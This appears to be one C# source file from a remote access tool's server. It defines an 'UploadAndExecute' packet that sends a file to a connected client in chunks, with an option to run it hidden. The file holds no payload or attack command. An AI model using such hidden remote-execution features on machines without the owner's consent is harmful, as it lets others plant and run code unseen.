using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class UploadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string FileName { get; set; }

        [ProtoMember(3)]
        public byte[] Block { get; set; }

        [ProtoMember(4)]
        public int MaxBlocks { get; set; }

        [ProtoMember(5)]
        public int CurrentBlock { get; set; }

        [ProtoMember(6)]
        public bool RunHidden { get; set; }

        [ProtoMember(7)]
        public string Type { get; set; }

        public UploadAndExecute()
        {
        }

        public UploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden, string type)
        {
            this.ID = id;
            this.FileName = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.RunHidden = runhidden;
            this.Type = type;
        }

        public void Execute(Client client)
        {
            client.Send<UploadAndExecute>(this);
        }
    }
}